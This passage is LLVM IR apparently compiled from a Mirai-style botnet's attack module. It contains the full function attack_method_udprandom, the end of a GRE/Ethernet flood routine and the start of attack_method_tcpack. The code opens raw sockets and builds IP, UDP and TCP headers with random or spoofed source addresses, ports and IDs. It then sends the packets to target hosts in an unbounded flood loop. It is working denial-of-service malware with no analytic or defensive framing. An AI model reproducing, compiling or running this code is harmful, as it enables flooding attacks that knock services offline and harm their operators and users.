  %365 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %366 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %365, i32 0, i32 9
  store i32 %364, i32* %366, align 4
  br label %373

; <label>:367:                                    ; preds = %360
  %368 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %369 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %368, i32 0, i32 9
  %370 = load i32, i32* %369, align 4
  %371 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %372 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %371, i32 0, i32 9
  store i32 %370, i32* %372, align 4
  br label %373

; <label>:373:                                    ; preds = %367, %363
  %374 = call i32 @rand_next()
  store i32 %374, i32* %37, align 4
  %375 = call i32 @rand_next()
  store i32 %375, i32* %38, align 4
  %376 = call i32 @rand_next()
  store i32 %376, i32* %39, align 4
  %377 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %378 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %377, i32 0, i32 0
  %379 = getelementptr inbounds [6 x i8], [6 x i8]* %378, i32 0, i32 0
  %380 = bitcast i32* %37 to i8*
  call void @util_memcpy(i8* %379, i8* %380, i32 4)
  %381 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %382 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %381, i32 0, i32 1
  %383 = getelementptr inbounds [6 x i8], [6 x i8]* %382, i32 0, i32 0
  %384 = bitcast i32* %38 to i8*
  call void @util_memcpy(i8* %383, i8* %384, i32 4)
  %385 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %386 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %385, i32 0, i32 0
  %387 = getelementptr inbounds [6 x i8], [6 x i8]* %386, i32 0, i32 0
  %388 = getelementptr inbounds i8, i8* %387, i64 4
  %389 = bitcast i32* %39 to i8*
  call void @util_memcpy(i8* %388, i8* %389, i32 2)
  %390 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %391 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %390, i32 0, i32 1
  %392 = getelementptr inbounds [6 x i8], [6 x i8]* %391, i32 0, i32 0
  %393 = getelementptr inbounds i8, i8* %392, i64 4
  %394 = bitcast i32* %39 to i8*
  %395 = getelementptr inbounds i8, i8* %394, i64 2
  call void @util_memcpy(i8* %393, i8* %395, i32 2)
  %396 = load i8, i8* %19, align 1
  %397 = icmp ne i8 %396, 0
  br i1 %397, label %398, label %401

; <label>:398:                                    ; preds = %373
  %399 = load i8*, i8** %36, align 8
  %400 = load i32, i32* %18, align 4
  call void @rand_str(i8* %399, i32 %400)
  br label %401

; <label>:401:                                    ; preds = %398, %373
  %402 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %403 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %402, i32 0, i32 7
  store i16 0, i16* %403, align 2
  %404 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %405 = bitcast %struct.iphdr* %404 to i16*
  %406 = call zeroext i16 @checksum_generic(i16* %405, i32 20)
  %407 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %408 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %407, i32 0, i32 7
  store i16 %406, i16* %408, align 2
  %409 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 7
  store i16 0, i16* %410, align 2
  %411 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %412 = bitcast %struct.iphdr* %411 to i16*
  %413 = call zeroext i16 @checksum_generic(i16* %412, i32 20)
  %414 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 7
  store i16 %413, i16* %415, align 2
  %416 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %417 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %416, i32 0, i32 3
  store i16 0, i16* %417, align 2
  %418 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %419 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %420 = bitcast %struct.udphdr* %419 to i8*
  %421 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %422 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %421, i32 0, i32 2
  %423 = load i16, i16* %422, align 2
  %424 = load i32, i32* %18, align 4
  %425 = sext i32 %424 to i64
  %426 = add i64 8, %425
  %427 = trunc i64 %426 to i32
  %428 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %418, i8* %420, i16 zeroext %423, i32 %427)
  %429 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %430 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %429, i32 0, i32 3
  store i16 %428, i16* %430, align 2
  %431 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %432 = load i32, i32* %9, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %431, i64 %433
  %435 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %434, i32 0, i32 0
  %436 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %435, i32 0, i32 0
  store i16 2, i16* %436, align 4
  %437 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %438 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %437, i32 0, i32 9
  %439 = load i32, i32* %438, align 4
  %440 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %441 = load i32, i32* %9, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %440, i64 %442
  %444 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %443, i32 0, i32 0
  %445 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %444, i32 0, i32 2
  %446 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %445, i32 0, i32 0
  store i32 %439, i32* %446, align 4
  %447 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %448 = load i32, i32* %9, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %447, i64 %449
  %451 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %450, i32 0, i32 0
  %452 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %451, i32 0, i32 1
  store i16 0, i16* %452, align 2
  %453 = load i32, i32* %10, align 4
  %454 = load i8*, i8** %30, align 8
  %455 = load i32, i32* %18, align 4
  %456 = sext i32 %455 to i64
  %457 = add i64 66, %456
  %458 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %459 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %460 = load i32, i32* %9, align 4
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %459, i64 %461
  %463 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %462, i32 0, i32 0
  %464 = bitcast %struct.sockaddr_in* %463 to %struct.sockaddr*
  store %struct.sockaddr* %464, %struct.sockaddr** %458, align 8
  %465 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %466 = load %struct.sockaddr*, %struct.sockaddr** %465, align 8
  %467 = call i64 @sendto(i32 %453, i8* %454, i64 %457, i32 16384, %struct.sockaddr* %466, i32 16)
  br label %468

; <label>:468:                                    ; preds = %401
  %469 = load i32, i32* %9, align 4
  %470 = add nsw i32 %469, 1
  store i32 %470, i32* %9, align 4
  br label %257

; <label>:471:                                    ; preds = %257
  br label %256

; <label>:472:                                    ; preds = %92, %86
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udprandom(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i32, align 4
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 8) #6
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 2, i32 0)
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %12, align 1
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 3, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 4, i32 64)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 5, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 6, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %16, align 2
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 7, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %17, align 2
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 0, i32 1458)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 1, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %19, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = load i32, i32* @LOCAL_ADDR, align 4
  %67 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 25, i32 %66)
  store i32 %67, i32* %20, align 4
  %68 = load i16, i16* %18, align 2
  %69 = zext i16 %68 to i32
  %70 = icmp sgt i32 %69, 1458
  br i1 %70, label %71, label %72

; <label>:71:                                     ; preds = %4
  store i16 1458, i16* %18, align 2
  br label %72

; <label>:72:                                     ; preds = %71, %4
  %73 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %73, i32* %10, align 4
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %75, label %76

; <label>:75:                                     ; preds = %72
  br label %314

; <label>:76:                                     ; preds = %72
  store i32 1, i32* %9, align 4
  %77 = load i32, i32* %10, align 4
  %78 = bitcast i32* %9 to i8*
  %79 = call i32 @setsockopt(i32 %77, i32 0, i32 3, i8* %78, i32 4) #6
  %80 = icmp eq i32 %79, -1
  br i1 %80, label %81, label %84

; <label>:81:                                     ; preds = %76
  %82 = load i32, i32* %10, align 4
  %83 = call i32 @close(i32 %82)
  br label %314

; <label>:84:                                     ; preds = %76
  store i32 0, i32* %9, align 4
  br label %85

; <label>:85:                                     ; preds = %167, %84
  %86 = load i32, i32* %9, align 4
  %87 = load i8, i8* %5, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp slt i32 %86, %88
  br i1 %89, label %90, label %170

; <label>:90:                                     ; preds = %85
  %91 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %92 = load i8**, i8*** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8*, i8** %92, i64 %94
  store i8* %91, i8** %95, align 8
  %96 = load i8**, i8*** %11, align 8
  %97 = load i32, i32* %9, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8*, i8** %96, i64 %98
  %100 = load i8*, i8** %99, align 8
  %101 = bitcast i8* %100 to %struct.iphdr*
  store %struct.iphdr* %101, %struct.iphdr** %21, align 8
  %102 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %103 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %102, i64 1
  %104 = bitcast %struct.iphdr* %103 to %struct.udphdr*
  store %struct.udphdr* %104, %struct.udphdr** %22, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %106 = bitcast %struct.iphdr* %105 to i8*
  %107 = load i8, i8* %106, align 4
  %108 = and i8 %107, 15
  %109 = or i8 %108, 64
  store i8 %109, i8* %106, align 4
  %110 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %111 = bitcast %struct.iphdr* %110 to i8*
  %112 = load i8, i8* %111, align 4
  %113 = and i8 %112, -16
  %114 = or i8 %113, 5
  store i8 %114, i8* %111, align 4
  %115 = load i8, i8* %12, align 1
  %116 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %117 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %116, i32 0, i32 1
  store i8 %115, i8* %117, align 1
  %118 = load i16, i16* %18, align 2
  %119 = zext i16 %118 to i64
  %120 = add i64 28, %119
  %121 = trunc i64 %120 to i16
  %122 = call zeroext i16 @htons(i16 zeroext %121) #7
  %123 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %124 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %123, i32 0, i32 2
  store i16 %122, i16* %124, align 2
  %125 = load i16, i16* %13, align 2
  %126 = call zeroext i16 @htons(i16 zeroext %125) #7
  %127 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %128 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %127, i32 0, i32 3
  store i16 %126, i16* %128, align 4
  %129 = load i8, i8* %14, align 1
  %130 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %131 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %130, i32 0, i32 5
  store i8 %129, i8* %131, align 4
  %132 = load i8, i8* %15, align 1
  %133 = icmp ne i8 %132, 0
  br i1 %133, label %134, label %138

; <label>:134:                                    ; preds = %90
  %135 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %136 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i32 0, i32 4
  store i16 %135, i16* %137, align 2
  br label %138

; <label>:138:                                    ; preds = %134, %90
  %139 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 6
  store i8 17, i8* %140, align 1
  %141 = load i32, i32* %20, align 4
  %142 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 8
  store i32 %141, i32* %143, align 4
  %144 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %145 = load i32, i32* %9, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i64 %146
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i32 0, i32 1
  %149 = load i32, i32* %148, align 4
  %150 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 9
  store i32 %149, i32* %151, align 4
  %152 = load i16, i16* %16, align 2
  %153 = call zeroext i16 @htons(i16 zeroext %152) #7
  %154 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %155 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %154, i32 0, i32 0
  store i16 %153, i16* %155, align 2
  %156 = load i16, i16* %17, align 2
  %157 = call zeroext i16 @htons(i16 zeroext %156) #7
  %158 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %159 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %158, i32 0, i32 1
  store i16 %157, i16* %159, align 2
  %160 = load i16, i16* %18, align 2
  %161 = zext i16 %160 to i64
  %162 = add i64 8, %161
  %163 = trunc i64 %162 to i16
  %164 = call zeroext i16 @htons(i16 zeroext %163) #7
  %165 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %166 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %165, i32 0, i32 2
  store i16 %164, i16* %166, align 2
  br label %167

; <label>:167:                                    ; preds = %138
  %168 = load i32, i32* %9, align 4
  %169 = add nsw i32 %168, 1
  store i32 %169, i32* %9, align 4
  br label %85

; <label>:170:                                    ; preds = %85
  br label %171

; <label>:171:                                    ; preds = %313, %170
  store i32 0, i32* %9, align 4
  br label %172

; <label>:172:                                    ; preds = %310, %171
  %173 = load i32, i32* %9, align 4
  %174 = load i8, i8* %5, align 1
  %175 = zext i8 %174 to i32
  %176 = icmp slt i32 %173, %175
  br i1 %176, label %177, label %313

; <label>:177:                                    ; preds = %172
  %178 = load i8**, i8*** %11, align 8
  %179 = load i32, i32* %9, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds i8*, i8** %178, i64 %180
  %182 = load i8*, i8** %181, align 8
  store i8* %182, i8** %23, align 8
  %183 = load i8*, i8** %23, align 8
  %184 = bitcast i8* %183 to %struct.iphdr*
  store %struct.iphdr* %184, %struct.iphdr** %24, align 8
  %185 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i64 1
  %187 = bitcast %struct.iphdr* %186 to %struct.udphdr*
  store %struct.udphdr* %187, %struct.udphdr** %25, align 8
  %188 = call i32 @rand() #6
  %189 = srem i32 %188, 4096
  %190 = add nsw i32 %189, 1
  %191 = sext i32 %190 to i64
  %192 = inttoptr i64 %191 to i8*
  store i8* %192, i8** %26, align 8
  %193 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %194 = load i32, i32* %9, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %193, i64 %195
  %197 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %196, i32 0, i32 2
  %198 = load i8, i8* %197, align 4
  %199 = zext i8 %198 to i32
  %200 = icmp slt i32 %199, 32
  br i1 %200, label %201, label %222

; <label>:201:                                    ; preds = %177
  %202 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %203 = load i32, i32* %9, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %202, i64 %204
  %206 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %205, i32 0, i32 1
  %207 = load i32, i32* %206, align 4
  %208 = call i32 @ntohl(i32 %207) #7
  %209 = call i32 @rand_next()
  %210 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %211 = load i32, i32* %9, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %210, i64 %212
  %214 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %213, i32 0, i32 2
  %215 = load i8, i8* %214, align 4
  %216 = zext i8 %215 to i32
  %217 = lshr i32 %209, %216
  %218 = add i32 %208, %217
  %219 = call i32 @htonl(i32 %218) #7
  %220 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 9
  store i32 %219, i32* %221, align 4
  br label %222

; <label>:222:                                    ; preds = %201, %177
  %223 = load i32, i32* %20, align 4
  %224 = icmp eq i32 %223, -1
  br i1 %224, label %225, label %229

; <label>:225:                                    ; preds = %222
  %226 = call i32 @rand_next()
  %227 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %228 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %227, i32 0, i32 8
  store i32 %226, i32* %228, align 4
  br label %229

; <label>:229:                                    ; preds = %225, %222
  %230 = load i16, i16* %13, align 2
  %231 = zext i16 %230 to i32
  %232 = icmp eq i32 %231, 65535
  br i1 %232, label %233, label %238

; <label>:233:                                    ; preds = %229
  %234 = call i32 @rand_next()
  %235 = trunc i32 %234 to i16
  %236 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %237 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %236, i32 0, i32 3
  store i16 %235, i16* %237, align 4
  br label %238

; <label>:238:                                    ; preds = %233, %229
  %239 = load i16, i16* %16, align 2
  %240 = zext i16 %239 to i32
  %241 = icmp eq i32 %240, 65535
  br i1 %241, label %242, label %247

; <label>:242:                                    ; preds = %238
  %243 = call i32 @rand_next()
  %244 = trunc i32 %243 to i16
  %245 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %246 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %245, i32 0, i32 0
  store i16 %244, i16* %246, align 2
  br label %247

; <label>:247:                                    ; preds = %242, %238
  %248 = load i16, i16* %17, align 2
  %249 = zext i16 %248 to i32
  %250 = icmp eq i32 %249, 65535
  br i1 %250, label %251, label %256

; <label>:251:                                    ; preds = %247
  %252 = call i32 @rand_next()
  %253 = trunc i32 %252 to i16
  %254 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %255 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %254, i32 0, i32 1
  store i16 %253, i16* %255, align 2
  br label %256

; <label>:256:                                    ; preds = %251, %247
  %257 = load i8, i8* %19, align 1
  %258 = icmp ne i8 %257, 0
  br i1 %258, label %259, label %263

; <label>:259:                                    ; preds = %256
  %260 = load i8*, i8** %26, align 8
  %261 = load i16, i16* %18, align 2
  %262 = zext i16 %261 to i32
  call void @rand_str(i8* %260, i32 %262)
  br label %263

; <label>:263:                                    ; preds = %259, %256
  %264 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i32 0, i32 7
  store i16 0, i16* %265, align 2
  %266 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %267 = bitcast %struct.iphdr* %266 to i16*
  %268 = call zeroext i16 @checksum_generic(i16* %267, i32 20)
  %269 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i32 0, i32 7
  store i16 %268, i16* %270, align 2
  %271 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %272 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %271, i32 0, i32 3
  store i16 0, i16* %272, align 2
  %273 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %274 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %275 = bitcast %struct.udphdr* %274 to i8*
  %276 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %277 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %276, i32 0, i32 2
  %278 = load i16, i16* %277, align 2
  %279 = load i16, i16* %18, align 2
  %280 = zext i16 %279 to i64
  %281 = add i64 8, %280
  %282 = trunc i64 %281 to i32
  %283 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %273, i8* %275, i16 zeroext %278, i32 %282)
  %284 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %285 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %284, i32 0, i32 3
  store i16 %283, i16* %285, align 2
  %286 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %287 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %286, i32 0, i32 1
  %288 = load i16, i16* %287, align 2
  %289 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %290 = load i32, i32* %9, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %289, i64 %291
  %293 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %292, i32 0, i32 0
  %294 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %293, i32 0, i32 1
  store i16 %288, i16* %294, align 2
  %295 = load i32, i32* %10, align 4
  %296 = load i8*, i8** %23, align 8
  %297 = load i16, i16* %18, align 2
  %298 = zext i16 %297 to i64
  %299 = add i64 28, %298
  %300 = bitcast %union.__CONST_SOCKADDR_ARG* %27 to %struct.sockaddr**
  %301 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %301, i64 %303
  %305 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %304, i32 0, i32 0
  %306 = bitcast %struct.sockaddr_in* %305 to %struct.sockaddr*
  store %struct.sockaddr* %306, %struct.sockaddr** %300, align 8
  %307 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %27, i32 0, i32 0
  %308 = load %struct.sockaddr*, %struct.sockaddr** %307, align 8
  %309 = call i64 @sendto(i32 %295, i8* %296, i64 %299, i32 16384, %struct.sockaddr* %308, i32 16)
  br label %310

; <label>:310:                                    ; preds = %263
  %311 = load i32, i32* %9, align 4
  %312 = add nsw i32 %311, 1
  store i32 %312, i32* %9, align 4
  br label %172

; <label>:313:                                    ; preds = %172
  br label %171

; <label>:314:                                    ; preds = %81, %75
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
